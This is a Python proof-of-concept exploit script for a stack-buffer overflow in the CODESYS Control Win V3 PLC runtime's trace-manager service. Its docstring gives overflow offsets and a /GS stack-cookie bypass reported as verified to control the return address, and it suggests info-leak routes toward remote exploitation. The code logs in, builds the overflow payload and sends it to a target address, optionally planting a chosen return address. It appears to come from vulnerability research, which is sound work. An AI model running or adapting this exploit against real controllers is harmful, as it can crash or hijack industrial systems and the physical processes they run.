#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CmpTraceMgr stack-overflow PoC — CODESYS Control Win V3 3.5.18.20.

Vulnerability
-------------
`TraceMgrServiceHandler` (CmpTraceMgr, service group 0x000F) parses the request
body as a tag stream and hands several tag payloads straight to `memcpy` with
the *attacker-supplied* tag length and a small stack buffer as destination.
Nothing between the tag parse and the copy bounds-checks the length — the parse
only proves the bytes are present in the received body, never that they fit.

    top level       tag 19 (0x13)  ->  memcpy(v26, src, len)   v26[4]   @ ebp-0xBC0
                    tag 20 (0x14)  ->  memcpy(v27, src, len)   v27[4]   @ ebp-0xBBC
                    tag 21 (0x15)  ->  memcpy(v28, src, len)   v28[20]  @ ebp-0xBB8
    in container    tag 48 (0x30)  ->  memcpy(v34, src, len)   v34[8]   @ ebp-0x1C
    0x86 (134)      tag 51 (0x33)  ->  memcpy(&v35, src, len)  v35(u32) @ ebp-0x14

The FreeBuf article calls out 19/20/21 ("当输入参数为19、20、21等值时进入memcpy
分支") and reproduces with 0x18AC bytes of 'A'.  The nested pair matters more in
practice: because container 0x86 / tag 0x30 is exactly what a *legitimate*
TRACE_CONFIGURE body carries (`... 86 01 e0 00 30 84 80 00 0a 00 00 00 ...`),
a well-formed-looking request reaches the same bug, and its destination sits
only 32 bytes from the saved return address instead of ~3 KB.

Distance from each destination to the saved return address
    tag 48 -> [ebp-0x1C]   0xC04 - 0xBE4 =   32 bytes   <- default trigger
    tag 51 -> [ebp-0x14]   0xC04 - 0xBEC =   24 bytes
    tag 19 -> [ebp-0xBC0]  0xC04 - 0x040 = 3012 bytes
    tag 20 -> [ebp-0xBBC]  0xC04 - 0x044 = 3008 bytes
    tag 21 -> [ebp-0xBB8]  0xC04 - 0x048 = 3004 bytes

The overflow does not touch the live tag-reader struct (ebx/`v30` @ ebp-0x538),
so the handler runs on to its epilogue.  It does **not** reach `ret` with
EIP = 0x41414141, though: the function carries a /GS stack cookie at `[ebp-4]`
(frame offset 0xbfc), and every destination above sits *below* it, so any fill
long enough to reach the return address necessarily smashes the cookie first.
The epilogue is

    xor ecx, ebp ; pop edi/esi/ebx ; call __security_check_cookie
    mov esp, ebp ; pop ebp ; ret

so a plain fill ends in `int 0x29` with ECX = 2
(FAST_FAIL_STACK_COOKIE_CHECK_FAILURE) and the process dies.

Bypassing it
------------
The slot is not the cookie itself: the epilogue is `mov ecx,[ebp-4] / xor ecx,ebp
/ call __security_check_cookie`, so `[ebp-4]` must hold `___security_cookie XOR
ebp`.  With both values known the payload just splices that slot in at offset
`COOKIE_OFF - dest` and continues to the return address:

    --security-cookie 0x4356070A --frame-ebp 0x027DEDD0

Verified 2026-09-23: cookie 0x4356070A, ebp 0x027DEDD0 -> slot 0xDAEA2B41
(matched the live [ebp-4]), and the run returned with EIP = 0x41414141,
EBP = 0x41414141 and ECX = 0x4356070A -- i.e. the check *passed*.

`ebp` is stable per process for this call path (two separate requests hit the
same memcpy with an identical ebp), so a recon request that stops at the
breakpoint and a follow-up exploit request agree.  But this is cookie-*aware*
exploitation, not a blind bypass: it needs `___security_cookie` and `ebp`, and
both are per-process.  Brute force is hopeless (every wrong guess is an
unhandleable `int 0x29` and a process restart), so a remote attack needs an
info leak first.  The likeliest candidates: the trace config carries a
client-supplied variable address (tag 0x4d) that would turn `0x0007` (read
samples) into an arbitrary read if it is not validated, or -- more elegant --
the large tag-19 overflow passes straight over the tag-reader struct `v30` at
ebp-0x538, so a shaped (non-'A') payload could set the reader's buffer pointer
and length and get a read/write primitive *before* the epilogue ever runs.

Dispatch, and why service 0x0002 is the right one
-------------------------------------------------
CmpTraceMgr registers group 0x000F with `sub_106BFA0(0x0F, sub_1077280)`, and
`sub_1077280` switches on the service id at `*(WORD *)(req + 6)`:

    case 1 .. 0x13:               // 19 services; default -> status 770 (0x302)
        case 2:  TraceMgrServiceHandler(a2, a3, a4, &a5)

Service 0x2 is the *only* id that reaches `TraceMgrServiceHandler`: it has
exactly one xref (the case-2 site), and of the group's 19 sub-functions only
that one contains a `memcpy` at all — the five sites listed above.  So whatever
label the article puts on it, 0x2 is the only service that can trigger this bug.

The constant is called `TRACE_CONFIGURE` in `codesys_udp_ds.py` from *observed
behaviour*, not from a symbol: the IDE sends 0x2 a body carrying the whole trace
configuration (name `App.Trace`, application, task, variable list) and gets a
handle back in tag 0x40.  The article's `TraceMgrSrvPacketCreate` matches this
handler — its tag 19/20/21 memcpy branches are exactly what it describes — but
this build has no string of that name; the closest are `tracemgrpacketcreate`
and `TraceMgrPacketCreate`, and the binary's name registry is not ordered by
service id, so the id->name binding cannot be read off statically.

Transport caveat (why the article's 0x18AC single-shot body cannot be replayed)
    The runtime's UDP frame buffer is ~512 bytes: a request whose *services*
    block exceeds ~472 bytes in one BLK frame is dropped silently, and a
    fragmented (`blk_first` + `blk_cont`) request is answered with a 0x84
    channel close.  Measured against this build: body 452B answers, body 484B
    does not; an otherwise byte-identical 2-frame split is refused outright.
    The IDE's 93 KB fragmented app download in 1.pcapng ran from UDP **1743**
    (CODESYS GatewayService), so the reassembly policy is evidently per-port —
    but 1743 is held by GatewayService here, and faking the datagram's endpoint
    index while bound to 1741 is rejected.  Hence the nested trigger, which
    needs only a 47-byte body and fits one datagram.

Addresses (3.5.18.20, image base 0x008A0000; the IDA dump is rebased by +0x5F0000)
    TraceMgrServiceHandler     0x00A88580   (IDA 0x1078580)
    call memcpy, tag 48        0x00A88833   (IDA 0x1078833)
    call memcpy, tag 19        0x00A8871B   (IDA 0x107871B)

Usage
    python trace_poc.py 192.168.125.129                 # nested tag 48, 64 A's
    python trace_poc.py 192.168.125.129 --tag 51        # 24 bytes to EIP
    python trace_poc.py 192.168.125.129 --tag 19 --length 400   # top-level, fits
    python trace_poc.py 192.168.125.129 --dry-run

The runtime is expected to *not* answer — the overwritten cookie kills it.
Confirm the root cause in x64dbg at 0x00A88833 (tag 48) or 0x00A8871B (tag 19):
the breakpoint hits, the destination reads all `0x41`, and the run leaves via
`__security_check_cookie` -> `int 0x29`.
"""

import argparse
import socket
import struct
import sys

from codesys_udp_ds import (
    CodesysClient, GRP_TRACE, TRACE_CONFIGURE, STATUS_OK, tag, parent_tag,
    parse_tags, dump_tags, status_of, build_ack,
)

#: trigger tag -> (container to nest in, frame offset of the destination,
#:                 description, bytes to the saved return address)
TRIGGERS = {
    48: (0x86, 0xBE4, "memcpy(v34, src, len)   v34[8]  @ ebp-0x1C", 32),
    51: (0x86, 0xBEC, "memcpy(&v35, src, len)  v35 u32 @ ebp-0x14", 24),
    19: (None, 0x040, "memcpy(v26, src, len)   v26[4]  @ ebp-0xBC0", 3012),
    20: (None, 0x044, "memcpy(v27, src, len)   v27[4]  @ ebp-0xBBC", 3008),
    21: (None, 0x048, "memcpy(v28, src, len)   v28[20] @ ebp-0xBB8", 3004),
}

#: frame offset of the /GS stack cookie (`var_4`); the epilogue does
#: `mov ecx,[ebp-4] / xor ecx,ebp / call __security_check_cookie`, so the slot
#: must hold `___security_cookie XOR <ebp at return>`.
COOKIE_OFF = 0xBFC
#: frame offset of the saved return address
RET_OFF = 0xC04

DEFAULT_TAG = 48
DEFAULT_LENGTH = 64

#: largest services block the runtime accepts in a single BLK frame
SINGLE_FRAME_SERVICES_MAX = 472


def build_body(tag_id, length, fill=b"A"):
    """Wrap `length` bytes of filler in the trigger tag.

    Tag 48/51 live inside container 0x86 — the shape a real TRACE_CONFIGURE
    body uses.  `parent_tag` supplies the container header; `tag()` writes the
    length as the 3-byte padded LEB128 the runtime itself emits (64 -> `c0 80
    00`), which parses identically to a minimal encoding.
    """
    inner = tag(tag_id, fill * length)
    container = TRIGGERS[tag_id][0]
    return parent_tag(container, inner) if container else inner


def build_cookie_body(tag_id, cookie, ebp, ret=0x41414141, length=None):
    """Payload that survives the /GS check and hijacks the return address.

    Layout, relative to the memcpy destination:
        [0 .. COOKIE_OFF-dest)      filler
        [COOKIE_OFF-dest .. +4)     cookie XOR ebp   <- what the epilogue wants
        [+4 .. +8)                  saved EBP       (popped, value irrelevant)
        [RET_OFF-dest .. +4)        return address

    `cookie` is the `___security_cookie` global and `ebp` the frame base at the
    check; both are readable in x64dbg, and `ebp` is stable per process for this
    call path (two different requests hit the same memcpy with an identical
    ebp), so a recon request plus an exploit request agree.
    """
    dest = TRIGGERS[tag_id][1]
    filler = COOKIE_OFF - dest
    slot = (cookie ^ ebp) & 0xFFFFFFFF
    ret_at = RET_OFF - dest
    payload = bytearray(b"A" * filler)
    payload += struct.pack("<I", slot)
    payload += struct.pack("<I", 0x41414141)          # saved EBP
    if len(payload) < ret_at:
        payload += b"A" * (ret_at - len(payload))
    assert len(payload) == ret_at, (len(payload), ret_at)
    payload += struct.pack("<I", ret)
    if length is not None:
        if length < len(payload):
            raise SystemExit(f"length {length} < {len(payload)} needed")
        payload += b"A" * (length - len(payload))
    inner = tag(tag_id, bytes(payload))
    container = TRIGGERS[tag_id][0]
    return parent_tag(container, inner) if container else inner


def quiesce(c):
    """ACK the last response and drop retransmits already in the socket.

    `CodesysClient.recv_services()` only ACKs multi-frame responses, so the
    single-frame reply to `app_login()` is left unacknowledged and the runtime
    keeps resending it.  Without this the PoC's `call()` would read that stale
    reply and report "the runtime answered" even though the process is gone.
    """
    if c.rx_blk:
        c.send_raw(build_ack(c.channel_id, c.token, c.rx_blk))
    dropped = 0
    while True:
        try:
            c.recv_raw(timeout=0.5)
            dropped += 1
        except (TimeoutError, socket.timeout, OSError):
            return dropped


def main():
    ap = argparse.ArgumentParser(
        description="CmpTraceMgr (0x000F/0x0002) memcpy stack-overflow PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("target", help="runtime IPv4 address, e.g. 192.168.125.129")
    ap.add_argument("--port", type=int, default=1740)
    ap.add_argument("--user", default="test")
    ap.add_argument("--password", default="test")
    ap.add_argument("--app-name", default="App")
    ap.add_argument("--local-port", type=int, default=1741,
                    help="client UDP port (1741/1742/1743; 1743 is the Gateway)")
    ap.add_argument("--tag", type=int, default=DEFAULT_TAG,
                    choices=sorted(TRIGGERS),
                    help=f"vulnerable tag id (default {DEFAULT_TAG})")
    ap.add_argument("--length", type=lambda s: int(s, 0), default=None,
                    help="filler length in bytes "
                         f"(default {DEFAULT_LENGTH}, or 4 past the EIP offset "
                         "for the chosen tag)")
    ap.add_argument("--security-cookie", type=lambda s: int(s, 0), default=None,
                    metavar="HEX",
                    help="value of the ___security_cookie global (x64dbg: "
                         "dump at 0x00F9B264).  With --frame-ebp, builds a "
                         "payload that survives the /GS check")
    ap.add_argument("--frame-ebp", type=lambda s: int(s, 0), default=None,
                    metavar="HEX",
                    help="ebp of the TraceMgrServiceHandler frame at the "
                         "memcpy (read it at the breakpoint).  Needed alongside "
                         "--security-cookie")
    ap.add_argument("--ret", type=lambda s: int(s, 0), default=0x41414141,
                    metavar="HEX",
                    help="return address to plant (default 0x41414141)")
    ap.add_argument("--dry-run", action="store_true",
                    help="build and print the request, do not send")
    args = ap.parse_args()

    container, dest_off, what, to_eip = TRIGGERS[args.tag]
    if (args.security_cookie is None) != (args.frame_ebp is None):
        ap.error("--security-cookie and --frame-ebp must be given together")

    cookie_mode = args.security_cookie is not None
    length = args.length if args.length is not None else max(DEFAULT_LENGTH,
                                                             to_eip + 4)
    if cookie_mode:
        body = build_cookie_body(args.tag, args.security_cookie, args.frame_ebp,
                                 args.ret, length)
    else:
        body = build_body(args.tag, length)
    services_len = len(body) + 20

    print("========== CmpTraceMgr stack overflow PoC ==========")
    print(f"  service : group 0x{GRP_TRACE:04X} / service 0x{TRACE_CONFIGURE:04X}"
          f"  (the article's TraceMgrSrvPacketCreate; the only id reaching"
          f" TraceMgrServiceHandler)")
    print(f"  trigger : tag {args.tag}"
          + (f" nested in container 0x{container:02x}" if container else "")
          + f"  ->  {what}")
    print(f"  offset  : {to_eip} bytes from the destination to the saved EIP")
    if cookie_mode:
        slot = (args.security_cookie ^ args.frame_ebp) & 0xFFFFFFFF
        print(f"  /GS     : cookie 0x{args.security_cookie:08x} ^ ebp "
              f"0x{args.frame_ebp:08x} -> slot 0x{slot:08x} "
              f"at [ebp-4] (payload +{COOKIE_OFF - dest_off})")
        print(f"  ret     : 0x{args.ret:08x}")
    print(f"  payload : {length} bytes "
          + ("with the /GS slot spliced in" if cookie_mode else f"of {b'A'!r}")
          + f", body {len(body)}B, services {services_len}B")
    if not cookie_mode and length <= to_eip:
        print(f"  [!] {length} <= {to_eip}: this will NOT reach the return "
              f"address")
    if not cookie_mode:
        print("  [i] plain 'A' fill smashes the /GS cookie at [ebp-4] first, so"
              " this dies in\n      __security_check_cookie (int 0x29) instead of"
              " reaching `ret`.  Add\n      --security-cookie/--frame-ebp to"
              " splice the correct slot in.")
    if services_len > SINGLE_FRAME_SERVICES_MAX:
        print(f"  [!] services block is {services_len}B but the runtime only "
              f"accepts ~{SINGLE_FRAME_SERVICES_MAX}B per datagram, and refuses\n"
              f"      fragmented requests from this port — the packet will be "
              f"dropped.  Use --tag 48 or --tag 51 for a small trigger.")
    if args.dry_run:
        print(f"\n  body ({len(body)}B):\n    {body[:64].hex(' ')}"
              + (" ..." if len(body) > 64 else ""))
        return 0

    # ---- handshake: channel -> session -> challenge -> login -> app login ----
    c = CodesysClient(args.target, args.port, "0.0.0.0", args.local_port,
                      verbose=True)
    try:
        c.open_channel()
        c.create_session()
        pem, challenge = c.get_public_key()
        status, _ = c.login(pem, challenge, args.user, args.password)
        if status != STATUS_OK:
            print(f"[-] device login failed (status={status}); the runtime will "
                  f"reject the trace request")
            return 1
        c.app_login(args.app_name)
    except Exception as e:
        print(f"\n[-] handshake failed: {e}")
        c.close()
        return 1

    # ---- fire ----
    print("\n========== sending PoC ==========")
    c.verbose = False                     # a multi-KB hex dump helps nobody
    print(f"  quiesced ({quiesce(c)} stale datagram(s) dropped)")
    try:
        hdr, resp = c.call(GRP_TRACE, TRACE_CONFIGURE, body)
    except (TimeoutError, socket.timeout):
        print("[+] no response to the PoC request.")
    except OSError as e:
        print(f"[+] connection went away during the PoC: {e}")
    else:
        print(f"[-] the runtime answered: group=0x{hdr['group']:04x} "
              f"service=0x{hdr['service_id']:04x} {len(resp)}B status="
              f"{status_of(parse_tags(resp))} — it did not crash.")
        dump_tags(parse_tags(resp))
        print("    Check the tag id, the payload length and that this build is "
              "really 3.5.18.20.")
        c.close()
        return 1

    print("\n========== RESULT ==========")
    print(f"  Sent {len(body)}B body (tag {args.tag}, {length} x 'A') to "
          f"channel 0x{c.channel_id:08x} / session 0x{c.session_id:08x}.")
    print("  No reply — which is what a dead process looks like from here.")
    print("  Confirm in x64dbg:")
    print(f"    - breakpoint 0x00A88833 (tag 48) / 0x00A8871B (tag 19) hits")
    print(f"    - the destination is [ebp-{'1C' if args.tag in (48, 51) else 'BC0'}"
          f"] and the size argument is {length}")
    print("    - after the copy, [ebp+4] (the return address) reads 0x41414141")
    print("    - the run then leaves via __security_check_cookie -> int 0x29")
    print("      (ECX=2, FAST_FAIL_STACK_COOKIE_CHECK_FAILURE): the /GS cookie at")
    print("      [ebp-4] is below the return address, so it is always smothered")
    print("      first.  EIP control needs the cookie leaked and rewritten.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
